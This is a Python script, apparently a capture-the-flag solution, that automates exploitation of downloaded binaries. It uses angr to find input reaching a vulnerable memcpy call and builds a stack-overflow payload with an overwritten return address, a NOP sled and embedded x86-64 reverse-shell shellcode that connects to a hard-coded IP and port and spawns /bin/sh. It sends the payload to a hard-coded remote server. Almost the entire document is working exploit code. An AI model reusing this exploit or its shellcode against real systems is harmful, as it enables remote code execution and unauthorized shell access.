import angr
import os
import base64
import datetime
import time
import simuvex
from pwn import *

ts = time.time()

BINARY = 'bin_'
# BINARY += '23_41_14'
BINARY += datetime.datetime.fromtimestamp(ts).strftime('%H_%M_%S')

shellcode = (
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
"\x02"
"\x7a\x69" # PORT
"\xc7\x44\x24\x04"
"\x8d\xdf\xaf\xe5" # IPADDR
"\x48\x89\xe6\x6a\x10"
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05")


DEBUG = True

def r(p, msg):
  response = p.recvuntil(msg)
  if DEBUG:
    print "[*] " + response
  return response

def get_vuln_addr():
  os.system("objdump -S ./bins/%s | grep memcpy | grep call > out" % BINARY)
  
  f = open("out", "r")
  vuln_addr_str = f.readline().split(":")[0][1:]
  vuln_addr = int(vuln_addr_str, 16)
  f.close()

  return vuln_addr

def get_entry(elf):
  start = elf.entry
  main = u64(elf.read(start + 0x20, 4) + "\x00" * 4)

  entry = main + 0xba
  # fail = main + 0xeb

  return entry

def get_fails():
  os.system("objdump -S ./bins/%s | grep ret > fails" % BINARY)
  
  fails = []

  f = open("fails", "r")

  while True:
    line = f.readline()
    if not line:
      break

    fail_addr_str = line.split(":")[0][1:]
    fail_addr = int(fail_addr_str, 16)

    fails.append(fail_addr)

  f.close()

  return fails

def generate_exploit ():
  BIN = "./bins/%s" % BINARY

  project = angr.Project(BIN, load_options={"auto_load_libs": False})
  elf = ELF(BIN)

  vuln_addr = get_vuln_addr()
  entry_point = get_entry(elf)
  fails = get_fails()

  target_addr = vuln_addr
  # target_addr = 0x4023d9

  argv1_buff = u64(elf.read(vuln_addr - 0x7, 4) + "\x00" * 4) - 0x14e
  # argv1_buff = 0x6070a0

  if DEBUG:
    log.info("Entry point: %x" % entry_point)
    log.info("Vuln address: %x" % vuln_addr)
    log.info("argv1 address: %x" % argv1_buff)
    # log.info("fail address: %x" % fail_addr)

  # Run angr
  argv1 = angr.claripy.BVS("argv1", 0x143 * 8)

  start_state = project.factory.blank_state(addr = entry_point)
  start_state.options.discard("LAZY_SOLVES")
  start_state.se._solver.timeout = 10000
  start_state.memory.store(argv1_buff, argv1)
  
  pg = project.factory.path_group(start_state, immutable = False)
  pg.explore(find = target_addr, avoid = tuple(fails))

  payload = pg.found[0].state.se.any_str(argv1)

  payload += "A" * (0x14e - len(payload))
  payload += "A" * 0x10
  payload += "A" * 0x8  # sfp
  payload += p64(argv1_buff + 0x200) #ret_addr
  
  payload += "\x90" * (0x200 - len(payload))
  payload += shellcode
  
  if DEBUG:
    log.info("Payload: %s" % payload.encode("hex"))

  return payload

def recv_program(p):
  r(p, "HEX ENCODED)")

  arr = r(p, "NOW GIVE ME YOUR INPUT").split()

  code = ''.join(arr[:-5])
  code_decoded = base64.b64decode(code);

  f = open ("./bins/%s" % BINARY, "w")
  f.write (code_decoded)
  f.close()

  os.system("chmod +x ./bins/%s" % BINARY)

  return code_decoded

def main():
  p = remote("52.78.11.234", 20222)

  recv_program(p) 

  payload = generate_exploit ()
  
  p.sendline(payload.encode("hex"))

  p.interactive()

  p.close ()

  if not DEBUG:
    os.system("./bins/%s" % BINARY)

if __name__ == '__main__':
  sys.exit(main())

